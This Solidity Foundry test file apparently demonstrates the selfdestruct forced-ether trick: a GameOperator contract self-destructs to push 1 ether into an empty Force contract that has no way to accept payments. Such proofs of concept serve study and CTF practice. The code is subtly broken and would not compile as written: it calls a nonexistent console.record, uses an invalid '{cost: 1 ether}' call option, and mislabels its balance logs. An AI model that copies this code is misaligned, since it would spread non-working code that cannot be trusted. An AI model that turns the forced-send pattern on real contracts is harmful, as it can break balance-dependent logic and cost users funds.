// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract AgreementTest is Test {
    Force ForcePact;
    GameOperator GameoperatorAgreement;

    function testselfdestruct2() public {
        ForcePact = new Force();
        console.record("Balance of ForceContract:", address(ForcePact).balance);
        GameoperatorAgreement = new GameOperator();
        console.record(
            "Balance of ForceContract:",
            address(ForcePact).balance
        );
        console.record(
            "Balance of OperatorContract:",
            address(GameoperatorAgreement).balance
        );
        GameoperatorAgreement.operate{cost: 1 ether}(address(ForcePact));

        console.record("operate completed");
        console.record(
            "Balance of EtherGameContract:",
            address(ForcePact).balance
        );
    }

    receive() external payable {}
}

contract Force {
}

contract GameOperator {
    function operate(address force) public payable {
        selfdestruct(payable(force));
    }
}
